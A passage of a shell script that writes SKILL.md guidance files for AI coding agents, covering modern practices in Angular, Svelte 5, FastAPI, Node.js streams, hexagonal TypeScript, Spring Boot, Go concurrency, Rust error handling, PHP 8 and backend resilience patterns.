4. Inject services using `inject()`.
5. Author templates using built-in control flow (`@if`, `@for`).

## Expected Output
Modern, standalone Angular component implementation with signal-based reactivity, inject() DI, and zero NgModule boilerplate.

## Validation Checklist
- [ ] Is `standalone: true` set on all components and pipes?
- [ ] Is `ChangeDetectionStrategy.OnPush` configured?
- [ ] Are templates using modern `@if` and `@for` control flow with tracking?
- [ ] Are services injected via `inject()` rather than constructor parameters?
- [ ] Are RxJS observables converted to signals with automatic unsubscription?

## Common Mistakes & Antipatterns
- Mutating signal objects directly: `mySignal().push(item)` instead of calling `mySignal.update(items => [...items, item])`.
- Omitting the `track` expression in `@for` loops, degrading list rendering performance.
- Subscribing to observables manually in `ngOnInit` and forgetting to unsubscribe in `ngOnDestroy`.

## Concrete Real-World Example
Scenario: An old Angular component using complex `ChangeDetectorRef.markForCheck()`, `*ngFor`, and multiple manual RxJS subscriptions causing memory leaks.
Prompt: Modernize this Angular product list component using Standalone Components and Angular Signals.
Application: The AI converts the component to standalone, replaces constructor DI with `inject(ProductService)`, converts RxJS streams to signals using `toSignal()`, migrates templates to `@for (product of products(); track product.id)`, and removes manual subscriptions.
EOF

cat << 'EOF' > skills/frontend/svelte/runes-reactive-state/SKILL.md
---
name: "runes-reactive-state"
description: "Building Svelte 5 web applications leveraging modern Runes ($state, $derived, $effect), typed component props, and reusable snippet blocks."
category: "frontend"
subcategory: "svelte"
language: "typescript"
framework: "svelte"
technology: "svelte5"
difficulty: "intermediate"
tags: ["frontend", "svelte", "svelte5", "runes", "snippets", "reactivity"]
---

# Svelte 5 Architecture with Runes and Snippets

## Purpose
Instruct AI agents in authoring clean, idiomatic Svelte 5 applications utilizing explicit universal reactivity with Runes instead of legacy Svelte 3/4 syntax.

## When to Use
Use when creating Svelte 5 components, refactoring legacy `let` and `$:` reactive declarations, or building flexible snippet-based UI components.

## Inputs / Context
Component mockups, reactive state requirements, prop types, and event bindings.

## Instructions
1. Declare reactive state using the `$state()` rune instead of legacy `let` declarations.
2. Declare derived values using the `$derived()` and `$derived.by()` runes instead of legacy `$:` reactive declarations.
3. Manage side-effects using the `$effect()` rune, ensuring cleanup functions are returned where needed.
4. Define component props and defaults using the `$props()` rune with strict TypeScript interfaces.
5. Use Svelte 5 `{#snippet name(params)}...{/snippet}` and `{@render name(args)}` blocks for reusable template slots and composition.
6. Manage deeply nested reactive objects or fine-grained arrays using `$state()` with automatic deep proxy tracking.
7. Use `$bindable()` inside `$props()` when two-way property binding (`bind:value`) is explicitly required by parent consumers.
8. Encapsulate shared cross-component state inside plain TypeScript `.svelte.ts` files using universal Runes.

## Constraints / Rules
- Do not use legacy Svelte 3/4 syntax (`$: double = count * 2`, `export let count`) in Svelte 5 codebases.
- Avoid performing side-effects inside `$derived()` computations.
- Never call `$effect()` during server-side rendering (SSR); `$effect` runs strictly in browser environments.

## Workflow
1. Define component prop interface and destructure using `$props()`.
2. Initialize internal state variables with `$state()`.
3. Compute derived state with `$derived()`.
4. Compose UI blocks using snippets and render tags.
5. Add browser side-effects in `$effect()` with teardown logic.

## Expected Output
Clean Svelte 5 component (`.svelte`) utilizing runes, snippet composition, and complete TypeScript typing.

## Validation Checklist
- [ ] Are all reactive variables declared with `$state()`?
- [ ] Are derived values computed using `$derived()`?
- [ ] Are props declared via `let { ... } = $props<Props>()`?
- [ ] Are reusable template fragments modeled with `{#snippet}` and `{@render}`?
- [ ] Is cross-file reactive state placed in `.svelte.ts` files?

## Common Mistakes & Antipatterns
- Mixing legacy `$:` reactivity syntax with Svelte 5 runes, causing compiler errors.
- Forgetting that `$state()` proxies deep mutations, attempting to create unnecessary shallow copies.
- Using `$effect` for state transformations that could be declared purely via `$derived`.

## Concrete Real-World Example
Scenario: Refactoring a Svelte 4 shopping cart component that uses multiple `$:` statements and `<slot>` projections into Svelte 5.
Prompt: Convert this Svelte 4 cart component to Svelte 5 Runes and Snippets.
Application: The AI rewrites `export let items` into `let { items = $bindable([]) } = $props<CartProps>()`, replaces `$:` calculations with `$derived(items.reduce(...))`, and replaces legacy `<slot name="item">` with a typed snippet rendered via `{@render itemSnippet(item)}`.
EOF

cat << 'EOF' > skills/backend/python/fastapi-production-service/SKILL.md
---
name: "fastapi-production-service"
description: "Architecting resilient, asynchronous FastAPI microservices with Pydantic v2 schemas, lifespan handlers, dependency injection, and database connection pooling."
category: "backend"
subcategory: "python"
language: "python"
framework: "fastapi"
technology: "pydantic-asyncpg"
difficulty: "intermediate"
tags: ["backend", "python", "fastapi", "pydantic", "asyncio", "lifespan", "dependency-injection"]
---

# Production FastAPI Service Architecture and Async Lifecycles

## Purpose
Provide concrete blueprints for building high-performance, asynchronous Python REST APIs utilizing modern FastAPI idioms, lifespan context managers, and strict type validation.

## When to Use
Use when creating new Python microservices, exposing machine learning models via REST APIs, or refactoring synchronous Flask/Django REST endpoints to async FastAPI.

## Inputs / Context
API requirements, data models, external integrations, authentication mechanisms, and database pool configuration.

## Instructions
1. Use FastAPI `lifespan` context manager on the `FastAPI` instance for startup and shutdown event handling (e.g., initializing connection pools and closing HTTP sessions), replacing deprecated `@app.on_event`.
2. Define request and response schemas using Pydantic v2 `BaseModel` with strict type annotations, field descriptions, and custom validators (`@field_validator`).
3. Leverage FastAPI's dependency injection system (`Depends()`) for database sessions, authentication context, and configuration objects.
4. Keep path operation functions asynchronous (`async def`) when calling async database drivers or HTTP clients; use standard `def` when calling synchronous/blocking libraries to allow FastAPI to execute them in an internal thread pool.
5. Standardize error responses using custom exception handlers and RFC 7807 Problem Details schemas.
6. Manage settings via `pydantic-settings` with environment variable overrides and `.env` parsing.
7. Integrate structured JSON logging with correlation/trace IDs injected via middleware.

## Constraints / Rules
- Never execute blocking I/O calls (e.g., `requests.get()`, `time.sleep()`) directly inside `async def` route handlers; use `httpx.AsyncClient` and `asyncio.sleep()`.
- Do not instantiate global database connection sessions; always yield sessions per request via dependencies.
- Never return raw database ORM entities directly in route responses; serialize through explicit Pydantic response models (`response_model=...`).

## Workflow
1. Define Pydantic request, response, and domain schemas.
2. Configure application lifespan context with database connection pool initialization.
3. Implement reusable service dependencies for auth and DB sessions.
4. Create modular APIRouter endpoints grouped by domain feature.
5. Add global exception handlers and correlation ID middleware.
6. Write integration tests using `httpx.AsyncClient` with `ASGITransport`.

## Expected Output
Modular FastAPI application code with lifespan management, Pydantic v2 schemas, async route handlers, and dependency-injected services.

## Validation Checklist
- [ ] Are startup/shutdown resources managed via `asynccontextmanager` lifespan?
- [ ] Are all blocking I/O calls isolated from the event loop?
- [ ] Are route responses filtered through explicit Pydantic response models?
- [ ] Is correlation ID middleware logging requests with unique trace identifiers?
- [ ] Are database sessions yielded and closed per-request using `Depends()`?

## Common Mistakes & Antipatterns
- Using `time.sleep()` inside an `async def` endpoint, completely freezing the single-threaded asyncio event loop for all concurrent users.
- Relying on deprecated `@app.on_event("startup")` handlers.
- Using `response_model_exclude_unset` inappropriately, accidentally leaking sensitive schema attributes.

## Concrete Real-World Example
Scenario: A FastAPI service crashes under load because synchronous `requests.post()` calls to a payment gateway block all incoming asyncio requests.
Prompt: Refactor this payment processing route to prevent event loop blocking and implement lifespan connection pooling.
Application: The AI creates an `httpx.AsyncClient` inside the application `lifespan` context manager, injects it into the route via `Depends()`, converts the route handler to async, and adds structured error handling with Pydantic v2 schemas.
EOF

cat << 'EOF' > skills/backend/javascript/node-event-loop-resilience/SKILL.md
---
name: "node-event-loop-resilience"
description: "Building memory-efficient, resilient Node.js backend services leveraging streams, event loop lag monitoring, backpressure management, and graceful shutdown."
category: "backend"
subcategory: "javascript"
language: "javascript"
framework: "none"
technology: "nodejs"
difficulty: "advanced"
tags: ["backend", "javascript", "nodejs", "streams", "backpressure", "event-loop", "resilience"]
---

# Node.js Event Loop Resilience and Stream Processing

## Purpose
Instruct AI agents to author robust Node.js backend applications capable of processing massive file and network payloads without exceeding heap limits or blocking the event loop.

## When to Use
Use when building data export services, file ingestion pipelines, high-throughput proxy servers, or long-running worker processes in Node.js.

## Inputs / Context
Data source, processing pipeline, destination sinks, memory limit thresholds, and shutdown signals.

## Instructions
1. Always process large datasets using Node.js streams (`stream.pipeline` or `stream/promises`) rather than buffering entire payloads into V8 memory (`fs.readFile` or large JSON arrays).
2. Respect backpressure in custom readable/writable streams: pause reading when `stream.write()` returns `false`, and resume on the `'drain'` event.
3. Monitor Event Loop Lag using `perf_hooks.monitorEventLoopDelay()` to detect CPU starvation and shed load before the process becomes unresponsive.
4. Implement graceful process shutdown by trapping `SIGTERM` and `SIGINT`:
   - Stop accepting new inbound connections (`server.close()`).
   - Drain active HTTP requests and database connection pools with a hard timeout (e.g., 10 seconds).
   - Exit with status code 0.
5. Handle `uncaughtException` and `unhandledRejection` by logging fatal context to stderr and terminating the process safely (`process.exit(1)`), relying on process orchestrators (Kubernetes/systemd) to restart.
6. Offload heavy cryptographic hashing, image manipulation, or compression to Worker Threads (`worker_threads`).

## Constraints / Rules
- Never buffer an unbounded stream into memory via `data += chunk` without strict byte length caps.
- Never ignore `'error'` events on EventEmitter or stream instances, as an unhandled error event will immediately crash the Node.js process.
- Avoid synchronous filesystem or crypto calls (`fs.readFileSync`, `crypto.pbkdf2Sync`) in request handling paths.

## Workflow
1. Identify large data ingestion or export requirements.
2. Construct pipeline using `stream.pipeline` with transform streams for chunk-by-chunk processing.
3. Attach signal listeners for graceful shutdown.
4. Add event loop delay monitoring and health check endpoints.
5. Verify peak memory usage under simulated 1GB file processing.

## Expected Output
Memory-stable Node.js service code using streams, backpressure handling, and graceful shutdown hooks.

## Validation Checklist
- [ ] Are streams piped using `stream.pipeline` with error handling?
- [ ] Is backpressure handled properly on writable streams?
- [ ] Does the service shut down gracefully on `SIGTERM` without dropping active requests?
- [ ] Are CPU-heavy tasks delegated to worker threads?
- [ ] Are unhandled rejections captured and logged with structured context?

## Common Mistakes & Antipatterns
- Reading multi-gigabyte CSV exports into a single memory variable with `fs.readFile()`, causing `FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory`.
- Piping streams using `readable.pipe(writable)` without handling errors, causing silent resource leaks if either stream fails.
- Swallowing `uncaughtException` and continuing execution in a corrupted process state.

## Concrete Real-World Example
Scenario: An enterprise Node.js data migration service crashes with OOM when exporting 500,000 database records to S3 as compressed CSV.
Prompt: Refactor this memory-intensive export script to use Node.js streams with backpressure.
Application: The AI creates a database cursor stream, pipes it through a CSV transform stream and a Gzip stream directly into an S3 multipart upload stream using `stream.pipeline`, maintaining memory consumption below 60MB throughout.
EOF

cat << 'EOF' > skills/backend/typescript/hexagonal-backend-architecture/SKILL.md
---
name: "hexagonal-backend-architecture"
description: "Structuring clean, testable TypeScript backend services using Hexagonal Architecture (Ports and Adapters) with pure domain logic decoupled from frameworks and infrastructure."
category: "backend"
subcategory: "typescript"
language: "typescript"
framework: "none"
technology: "typescript"
difficulty: "advanced"
tags: ["backend", "typescript", "hexagonal-architecture", "clean-architecture", "ports-and-adapters", "domain-driven-design"]
---

# Hexagonal Ports and Adapters Backend Architecture in TypeScript

## Purpose
Provide architectural discipline for decoupling core business rules from external technologies (databases, HTTP frameworks, message brokers) using TypeScript interfaces and dependency inversion.

## When to Use
Use when architecting long-lived enterprise backends, core domain business engines, or microservices that must support interchangeable storage backends or test doubles.

## Inputs / Context
Domain entities, business rules, primary driven actors (database, third-party APIs), and primary driving actors (HTTP controllers, CLI, queues).

## Instructions
1. Organize code into three distinct concentric layers:
   - Domain Layer: Entities, Value Objects, Domain Errors, and pure business invariants. Zero dependencies on external libraries or frameworks.
   - Application Layer: Use Cases / Command Handlers and Port interfaces (inbound and outbound).
   - Infrastructure Layer: Adapters implementing Port interfaces (PostgreSQL repository, Stripe payment adapter, Express/Fastify HTTP controllers).
2. Inbound Ports: Define TypeScript interfaces for use cases consumed by Driving Adapters (e.g., `RegisterUserUseCase`).
3. Outbound Ports: Define TypeScript interfaces for external dependencies required by the domain (e.g., `UserRepository`, `NotificationGateway`).
4. Outbound Adapters: Implement outbound ports inside the infrastructure layer using concrete technologies (e.g., `PostgresUserRepository implements UserRepository`).
5. Invert dependencies: Domain and Application layers must never import code from the Infrastructure layer.
6. Assemble dependencies at the application entrypoint (Composition Root) using dependency injection containers or manual constructor injection.
7. Express domain errors as distinct classes extending a base `DomainError` rather than HTTP status codes.

## Constraints / Rules
- Never import ORM models (Prisma, TypeORM, Mongoose) or HTTP objects (Express `Request`, `Response`) inside the Domain or Application layers.
- Do not allow infrastructure details (like SQL column names or JSON field formats) to dictate domain entity properties.
- Avoid circular dependencies between domain modules.

## Workflow
1. Define core domain entities and value objects with internal validation.
2. Declare Outbound Port interfaces for data persistence and external integrations.
3. Write Application Use Cases implementing business workflows via Port interfaces.
4. Implement Infrastructure Adapters (ORM repos, HTTP clients) satisfying the Port interfaces.
5. Bind adapters to use cases in the application entrypoint Composition Root.
6. Write unit tests for use cases by mocking port interfaces in memory without databases.

## Expected Output
Modular TypeScript codebase organized by Domain, Application, and Infrastructure layers, with complete Port interfaces and zero framework leakage into domain models.

## Validation Checklist
- [ ] Are Domain and Application layers completely free of framework and database imports?
- [ ] Are all external integrations represented as Outbound Port interfaces?
- [ ] Are Use Cases testable in memory using mock repositories without Docker or DBs?
- [ ] Is dependency wiring consolidated in a single Composition Root?
- [ ] Are domain errors decoupled from HTTP status codes?

## Common Mistakes & Antipatterns
- Coupling domain models to ORM decorators (like TypeORM `@Entity()` or `@Column()`), polluting pure business logic with database metadata.
- Passing HTTP `req` and `res` objects directly into use cases or service methods.
- Defining outbound port interfaces inside the infrastructure folder instead of the application layer.

## Concrete Real-World Example
Scenario: An e-commerce service has order processing logic tightly coupled to Express controllers and raw MongoDB queries, making it impossible to test without a live database.
Prompt: Refactor this order checkout flow into Hexagonal Architecture using TypeScript.
Application: The AI creates an `Order` domain entity with validation methods, defines an `OrderRepository` outbound port and `CheckoutUseCase` inbound port, implements `MongoOrderRepository` in infrastructure, and wires them together cleanly at the composition root.
EOF

cat << 'EOF' > skills/backend/java/spring-boot-domain-service/SKILL.md
---
name: "spring-boot-domain-service"
description: "Developing robust Java enterprise applications using Spring Boot 3, declarative transaction boundaries, record DTOs, JPA repository best practices, and Problem Details."
category: "backend"
subcategory: "java"
language: "java"
framework: "spring-boot"
technology: "spring-boot-3"
difficulty: "advanced"
tags: ["backend", "java", "spring-boot", "jpa", "transactions", "dto", "records"]
---

# Spring Boot 3 Enterprise Service Architecture and Transactions

## Purpose
Guide AI in authoring high-throughput Spring Boot 3 backend services with correct transactional isolation, N+1 query prevention, immutable DTOs, and standard REST responses.

## When to Use
Use when creating enterprise microservices with Spring Boot 3, implementing transactional workflows, or refactoring legacy Spring code.

## Inputs / Context
Business domain model, persistence requirements, transaction isolation rules, and REST endpoint contracts.

## Instructions
1. Standardize data transfer objects using Java 21+ `record` types for immutability and concise syntax.
2. Apply `@Transactional(readOnly = true)` at the class level for service classes; apply `@Transactional` explicitly only to write/mutation methods.
3. Prevent JPA N+1 query problems by using `@EntityGraph`, JOIN FETCH queries, or Spring Data projections.
4. Separate REST Controller layer from Service layer: controllers handle HTTP parameter binding and validation (`@Valid`), while services encapsulate domain logic.
5. Implement global exception handling using `@RestControllerAdvice` and RFC 7807 `ProblemDetail` responses.
6. Use constructor-based dependency injection (preferably via Lombok `@RequiredArgsConstructor` or explicit final field constructors); avoid field injection via `@Autowired`.
7. Configure database connection pool (HikariCP) with explicit maximum pool size, connection timeout, and validation intervals.
8. Externalize configuration using `@ConfigurationProperties` with validation (`@Validated`) rather than scattered `@Value` annotations.

## Constraints / Rules
- Never use field injection (`@Autowired private MyService myService;`); always use constructor injection.
- Never call a `@Transactional` method from within the same class (self-invocation), as Spring's AOP proxy will not intercept the call and no transaction will be started.
- Avoid returning raw JPA Entities directly from `@RestController` methods; always map to immutable record DTOs.

## Workflow
1. Define JPA entities with appropriate indexes and fetch strategies (`FetchType.LAZY` on associations).
2. Create Spring Data JPA repositories with query specifications.
3. Implement Service layer with declarative `@Transactional` boundaries.
4. Author REST controllers consuming and returning Java record DTOs.
5. Create `@RestControllerAdvice` mapping domain exceptions to `ProblemDetail`.
6. Write integration tests using `@DataJpaTest` and `@SpringBootTest` with Testcontainers.

## Expected Output
Clean Spring Boot 3 application code with constructor injection, record DTOs, transactional service boundaries, and RFC 7807 error handling.

## Validation Checklist
- [ ] Are all dependencies injected via constructors?
- [ ] Are DTOs modeled as immutable Java records?
- [ ] Is `readOnly = true` configured on read operations to optimize database snapshots?
- [ ] Are all JPA relations configured with `FetchType.LAZY`?
- [ ] Does global exception handling return standard `ProblemDetail` responses?

## Common Mistakes & Antipatterns
- Using `FetchType.EAGER` on `@OneToMany` or `@ManyToMany` relations, causing massive unexpected database joins and performance degradation.
- Self-invoking `@Transactional` methods within the same bean, leading to silent transaction rollback failures.
- Leaving `@Transactional` on methods that perform slow external HTTP calls, holding database connections open unnecessarily.

## Concrete Real-World Example
Scenario: A Spring Boot banking transfer endpoint suffers from lock timeouts and occasional double-spending under concurrent requests.
Prompt: Refactor this money transfer endpoint for transactional integrity, idempotency, and proper exception handling.
Application: The AI isolates the transfer method with `@Transactional(isolation = Isolation.REPEATABLE_READ)`, applies optimistic locking via `@Version` on the Account entity, verifies debit/credit balances atomically, maps exceptions to RFC 7807 `ProblemDetail`, and maps responses to an immutable `TransferResponse` record.
EOF

cat << 'EOF' > skills/backend/go/idiomatic-concurrency-patterns/SKILL.md
---
name: "idiomatic-concurrency-patterns"
description: "Architecting high-throughput Go backend services utilizing goroutines, buffered channels, sync.ErrGroup, context propagation, and graceful worker pools."
category: "backend"
subcategory: "go"
language: "go"
framework: "none"
technology: "golang"
difficulty: "advanced"
tags: ["backend", "go", "golang", "concurrency", "goroutines", "channels", "context", "errgroup"]
---

# Idiomatic Go Concurrency, Context Cancellation, and Channels

## Purpose
Instruct AI agents to author leak-free, idiomatic Go concurrent systems with deterministic lifecycle management, context propagation, and thread-safe data access.

## When to Use
Use when writing Go microservices, concurrent worker pools, batch processors, stream aggregators, or CLI tools requiring parallel execution.

## Inputs / Context
Task throughput requirements, concurrency limits, timeout boundaries, and downstream service dependencies.

## Instructions
1. Always pass `context.Context` as the first argument in functions performing I/O or launching goroutines; never store a Context in a struct.
2. Manage concurrent goroutine lifecycles and error propagation using `golang.org/x/sync/errgroup` with context cancellation.
3. Prevent goroutine leaks: every spawned goroutine must have an explicit termination condition (channel closure, context cancellation, or worker exit signal).
4. Implement bounded worker pools using buffered job channels to control memory consumption and downstream resource saturation.
5. Handle channel communication safely:
   - Only the sender should close a channel, never the receiver.
   - Never send on a closed channel (panics).
   - Use `select` with `ctx.Done()` to prevent blocking indefinitely on channel sends or receives.
6. Protect shared mutable state using `sync.Mutex` or `sync.RWMutex`; prefer passing ownership via channels when possible ('Do not communicate by sharing memory; instead, share memory by communicating').
7. Always check and propagate errors explicitly; wrap errors with context using `fmt.Errorf("operation failed: %w", err)` to preserve error chains for `errors.Is` and `errors.As`.

## Constraints / Rules
- Never launch fire-and-forget goroutines (`go func() { ... }()`) without tracking via `sync.WaitGroup` or `errgroup.Group`.
- Never use `context.Background()` deep inside business logic; propagate caller context.
- Avoid package-level global variables for state management.

## Workflow
1. Define worker contract accepting `context.Context` and typed data.
2. Initialize `errgroup.WithContext(ctx)` with a concurrency limit (`eg.SetLimit(n)`).
3. Feed tasks into the pool, capturing errors on completion.
4. Handle system shutdown signals (`signal.NotifyContext`) to trigger graceful teardown.
5. Validate with Go race detector (`go test -race ./...`).

## Expected Output
Idiomatic, race-free Go concurrency code featuring context cancellation, bounded worker pools, explicit error wrapping, and clean channel semantics.

## Validation Checklist
- [ ] Is `context.Context` propagated to all goroutines and I/O calls?
- [ ] Are goroutine lifetimes bounded and guaranteed to terminate?
- [ ] Is `go test -race` passing with zero data races detected?
- [ ] Are errors wrapped using the `%w` verb for chain inspection?
- [ ] Are channels closed only by the sending goroutine?

## Common Mistakes & Antipatterns
- Spawning an unbounded number of goroutines inside an HTTP handler loop: `for _, item := range items { go process(item) }`, exhausting file descriptors under load.
- Creating a goroutine that sends to an unbuffered channel without a reader, hanging forever and leaking memory.
- Closing a channel from multiple consumer goroutines, triggering fatal panics.

## Concrete Real-World Example
Scenario: A Go web scraper crashes the server with thousands of open sockets when given a large list of URLs.
Prompt: Refactor this Go scraper into a bounded worker pool that respects cancellation and reports the first failure.
Application: The AI creates an `errgroup.Group` with `eg.SetLimit(10)`, iterates over URLs checking `ctx.Err()`, makes requests with context-aware `http.NewRequestWithContext`, wraps errors with `fmt.Errorf`, and collects results deterministically.
EOF

cat << 'EOF' > skills/backend/rust/safe-error-propagation/SKILL.md
---
name: "safe-error-propagation"
description: "Designing robust, panic-free Rust backend services utilizing `Result<T, E>`, `Option<T>`, `thiserror` for library domains, and `anyhow` for application orchestration."
category: "backend"
subcategory: "rust"
language: "rust"
framework: "none"
technology: "rust"
difficulty: "advanced"
tags: ["backend", "rust", "error-handling", "result", "thiserror", "anyhow", "type-safety"]
---

# Rust Safe Error Propagation and Domain Modeling with Thiserror

## Purpose
Provide concrete rules for structuring idiomatic Rust error hierarchies, ensuring all failure modes are explicit, strongly typed, and handled without unexpected runtime panics.

## When to Use
Use when developing Rust libraries, backend services, network daemons, or CLI tools where reliability and zero crashes are mandatory.

## Inputs / Context
Domain entities, fallible operations (I/O, parsing, network), third-party error types, and public API boundary contracts.

## Instructions
1. Distinguish between expected domain failures (modeled via `Result<T, E>`) and irrecoverable programmatic bugs (asserts/panics).
2. For domain and service boundaries, define explicit, typed error enums using the `thiserror` derive macro (`#[derive(thiserror::Error, Debug)]`).
3. For top-level application binaries and CLI orchestrators, use `anyhow::Result<T>` with `.context("...")` to add operational troubleshooting context to error traces.
4. Propagate errors idiomatically using the `?` operator; implement `From<OtherError>` (or `#[from]` attribute in `thiserror`) for clean automatic error conversions.
5. Eliminate `.unwrap()` and `.expect()` calls in production library code; use `.ok_or()` or pattern matching with `if let` / `match` instead.
6. Make illegal states unrepresentable using Rust's rich type system: use enums for multi-state entities and newtypes for validated identifiers (e.g., `struct EmailAddress(String)`).
7. Ensure all error types implement `std::error::Error + Send + Sync + 'static` for seamless thread transfer and async task compatibility.

## Constraints / Rules
- Never call `.unwrap()` on fallible operations in production server code.
- Avoid using `Box<dyn std::error::Error>` across internal domain boundaries; prefer explicit typed enums.
- Do not discard underlying error causes; always chain root causes via `#[source]`.

## Workflow
1. Enumerate all potential failure modes for the domain module.
2. Construct a typed error enum with `#[derive(thiserror::Error)]` and descriptive messages.
3. Return `Result<T, DomainError>` from all fallible service functions.
4. Use `?` operator for clean propagation and `.context()` for entrypoint logging.
5. Verify via `cargo check` and `cargo clippy` with strict linting rules.

## Expected Output
Panic-free, idiomatic Rust code featuring strongly typed error enums, seamless `?` propagation, and rich context diagnostics.

## Validation Checklist
- [ ] Are all fallible paths returning `Result<T, E>` without `.unwrap()`?
- [ ] Are domain errors categorized via typed `thiserror` enums?
- [ ] Do errors chain root causes via `#[source]` or `#[from]`?
- [ ] Are top-level application errors enriched with `anyhow::Context`?
- [ ] Does `cargo clippy -- -D warnings` pass cleanly?

## Common Mistakes & Antipatterns
- Sprinkling `.unwrap()` throughout request parsing code, causing the entire web worker thread or service to panic when given malformed JSON.
- Using stringly-typed errors (`Err("Something went wrong".to_string())`) which cannot be inspected or matched programmatically.
- Swallowing error sources, destroying stack context when diagnosing production outages.

## Concrete Real-World Example
Scenario: A Rust microservice parsing config files and querying Postgres crashes at startup due to `.unwrap()` calls on missing environment variables.
Prompt: Refactor this Rust configuration loader to use robust error handling with `thiserror` and `anyhow`.
Application: The AI defines a `ConfigError` enum with `thiserror` handling missing env vars, invalid port numbers, and database connection failures, replaces `.unwrap()` with `?`, and adds rich `.with_context(|| format!("failed loading {}", path))` in the main startup sequence.
EOF

cat << 'EOF' > skills/backend/php/modern-service-container/SKILL.md
---
name: "modern-service-container"
description: "Architecting modern PHP 8.2+ backend services using strict typing, constructor property promotion, readonly classes, PSR-11 dependency injection, and native Attributes."
category: "backend"
subcategory: "php"
language: "php"
framework: "none"
technology: "php8"
difficulty: "intermediate"
tags: ["backend", "php", "php8", "dependency-injection", "psr-11", "readonly", "attributes"]
---

# Modern PHP 8+ Architecture with Dependency Injection and Attributes

## Purpose
Provide modern, strictly-typed PHP patterns that eliminate legacy antipatterns and leverage modern PHP 8.2+ features for type safety and clean service architecture.

## When to Use
Use when authoring modern PHP applications, microservices, Symfony/Laravel service layers, or PSR-compliant packages.

## Inputs / Context
Service interfaces, business requirements, configuration parameters, and external client specifications.

## Instructions
1. Enforce strict typing at the top of every PHP file using `declare(strict_types=1);`.
2. Utilize PHP 8+ Constructor Property Promotion and `readonly` classes for immutable DTOs and value objects (`final readonly class UserData`).
3. Leverage Native PHP Attributes for metadata and routing instead of legacy docblock annotations (`/** @Route(...) */`).
4. Design services against PSR-11 Container and PSR-14 Event Dispatcher standards; program to interfaces, not concrete implementations.
5. Use union types (`int|string`), intersection types (`Countable&Traversable`), and `match` expressions for exhaustive, type-safe conditional logic.
6. Replace magic getters/setters (`__get`, `__set`) with explicit typed methods or public readonly properties.
7. Wrap domain exceptions in strongly typed custom exception classes extending `\DomainException` or `\RuntimeException`.

## Constraints / Rules
- Never write PHP files without `declare(strict_types=1);`.
- Avoid the Service Locator antipattern (passing the DI container into business services); inject specific service interfaces instead.
- Never suppress errors using the `@` error control operator.

## Workflow
1. Define immutable Value Objects and DTOs using `final readonly class`.
2. Declare service contracts as explicit PHP interfaces.
3. Implement services using constructor property promotion for dependency injection.
4. Bind interfaces to implementations in the PSR-11 container configuration.
5. Verify code with PHPStan at Level 8 or 9.

## Expected Output
Modern, strictly typed PHP 8.2+ codebase utilizing readonly classes, native attributes, constructor promotion, and clean interface segregation.

## Validation Checklist
- [ ] Is `declare(strict_types=1);` present at the top of every file?
- [ ] Are immutable objects declared as `readonly`?
- [ ] Are dependencies injected as interfaces via constructors?
- [ ] Are match expressions used instead of verbose switch-case statements?
- [ ] Does PHPStan pass without errors at Level 8+?

## Common Mistakes & Antipatterns
- Using `mixed` or omitting type hints on method parameters and returns.
- Using docblock annotations like `@var` or `@return` instead of native PHP 8 types.
- Passing the entire DI container into a service, hiding the service's actual dependencies.

## Concrete Real-World Example
Scenario: A legacy PHP payment service uses untyped arrays for order data and accesses database connections via global static singletons.
Prompt: Modernize this payment gateway into strictly typed PHP 8.2 with dependency injection.
Application: The AI creates an immutable `PaymentRequest` readonly DTO, defines a `PaymentGatewayInterface`, implements `StripePaymentGateway` with constructor-injected credentials, and binds it via a PSR-11 container with strict type declarations.
EOF

cat << 'EOF' > skills/backend/general/rate-limiting-and-resilience/SKILL.md
---
name: "rate-limiting-and-resilience"
description: "Designing high-reliability backend resilience patterns including token bucket rate limiting, distributed circuit breakers, and jittered exponential backoff retries."
category: "backend"
subcategory: "general"
language: "agnostic"
framework: "none"
technology: "distributed-systems"
difficulty: "advanced"
tags: ["backend", "resilience", "rate-limiting", "circuit-breaker", "retries", "fault-tolerance"]
---

# Backend Rate Limiting, Circuit Breakers, and Retries

## Purpose
Provide universal architectural patterns for safeguarding backend systems against cascading failures, traffic spikes, and degraded third-party downstream dependencies.

## When to Use
Use when integrating external HTTP APIs, designing public API gateways, or stabilizing services under heavy load.

## Inputs / Context
Traffic thresholds, downstream SLA constraints, failure rate trigger conditions, and retry policies.

## Instructions
1. Implement Rate Limiting at the ingress gateway using the Token Bucket or Sliding Window Counter algorithm backed by Redis.
2. Return standard HTTP headers on rate-limited responses: `X-RateLimit-Limit`, `X-RateLimit-Remaining`, `X-RateLimit-Reset`, and HTTP `429 Too Many Requests` with a `Retry-After` header.
3. Protect downstream integrations using the Circuit Breaker pattern with three distinct states:
   - Closed: Normal operation; requests pass through.
   - Open: Failure threshold exceeded (e.g., 50% errors over 10s); fail fast immediately without calling downstream.
   - Half-Open: Trial state; allow a small percentage of probe requests through to test service recovery.
4. Implement Retries strictly for transient failures (HTTP 408, 429, 502, 503, 504 and network timeouts); never retry non-idempotent 4xx client errors (400, 401, 403, 404, 422).
5. Always apply Full Jitter to Exponential Backoff retry calculations (`sleep = random(0, min(max_backoff, base * 2 ^ attempt))`) to prevent the 'thundering herd' problem.
6. Enforce hard timeout limits on all outbound socket connections and request execution phases.

## Constraints / Rules
- Never retry non-idempotent operations (e.g., POST payments) without an explicit Idempotency Key.
- Avoid infinite retry loops; cap maximum retry attempts (typically 3-5).
- Never implement circuit breakers using local in-memory state when running across a multi-instance auto-scaled cluster without centralized state synchronization.

## Workflow
1. Define SLA, timeout budgets, and error rate thresholds for each external dependency.
2. Configure sliding window rate limiters per IP / API key.
3. Wrap external client calls in a circuit breaker wrapper.
4. Implement retry loops with jittered backoff for idempotent operations.
5. Expose Prometheus metrics for circuit state changes and rejected requests.

## Expected Output
Resilience layer implementation providing distributed rate limiting, circuit breaker state management, and jittered retries.

## Validation Checklist
- [ ] Are rate limit responses returning HTTP 429 and `Retry-After` headers?
- [ ] Does the circuit breaker trip to Open state when failure thresholds are crossed?
- [ ] Are retries restricted to transient errors and idempotent operations?
- [ ] Is randomized jitter added to exponential backoff delays?
- [ ] Are socket and request timeouts configured on all outbound clients?

## Common Mistakes & Antipatterns
- Retrying failed requests with a fixed delay, synchronizing hundreds of clients and repeatedly knocking down the recovering server.
- Retrying HTTP 400 Bad Request or HTTP 401 Unauthorized errors that will never succeed on repeat.
- Lacking outbound timeouts, causing web worker threads to hang indefinitely when a partner API degrades.

## Concrete Real-World Example
Scenario: When an external SMS provider suffers a micro-outage, an auth service locks up because hundreds of worker threads hang waiting on timed-out HTTP calls.
Prompt: Implement a resilient HTTP client wrapper with circuit breaking and retries for this SMS notification service.
